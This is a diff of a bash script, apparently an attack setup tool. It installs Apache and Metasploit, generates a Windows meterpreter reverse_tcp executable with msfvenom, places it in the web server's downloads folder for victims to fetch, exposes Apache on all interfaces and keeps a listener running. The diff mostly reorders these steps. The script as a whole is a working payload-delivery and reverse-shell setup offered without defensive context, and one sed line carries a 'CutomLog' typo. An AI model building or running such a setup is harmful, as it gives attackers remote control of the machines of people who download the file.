@@ -4,18 +4,12 @@
 sudo apt-get update
 sudo apt-get install apache2 metasploit-framework -y
 
-# Configure Apache to listen on all network interfaces and log requests to a file
-sudo sed -i 's/Listen 80/Listen 0.0.0.0:80/g' /etc/apache2/ports.conf
-sudo sed -i 's/#CustomLog/CutomLog/g' /etc/apache2/sites-available/000-default.conf
-sudo sed -i 's/#ErrorLog/ErrorLog/g' /etc/apache2/sites-available/000-default.conf
-sudo service apache2 restart
-
-# Get the IP address of the current machine
-ip=$(hostname -I | cut -d' ' -f1)
-
 # Set the name and path of the payload to be generated
 payloadname=payload_$(date +%s).exe
 payloadpath=/var/www/html/downloads/$payloadname
+
+# Get the IP address of the current machine
+ip=$(hostname -I | cut -d' ' -f1)
 
 # Set the IP address and port of the listener
 lhost=$ip
@@ -26,6 +20,12 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o 
 
 # Set the permissions of the file so that it can be downloaded
 chmod 644 $payloadpath
+
+# Configure Apache to listen on all network interfaces and log requests to a file
+sudo sed -i 's/Listen 80/Listen 0.0.0.0:80/g' /etc/apache2/ports.conf
+sudo sed -i 's/#CustomLog/CutomLog/g' /etc/apache2/sites-available/000-default.conf
+sudo sed -i 's/#ErrorLog/ErrorLog/g' /etc/apache2/sites-available/000-default.conf
+sudo service apache2 restart
 
 # Start the Apache web server
 sudo systemctl start apache2
@@ -50,3 +50,4 @@ echo "Metasploit listener set up on $lhost:$lport"
 while true; do
     sleep 1
 done
+
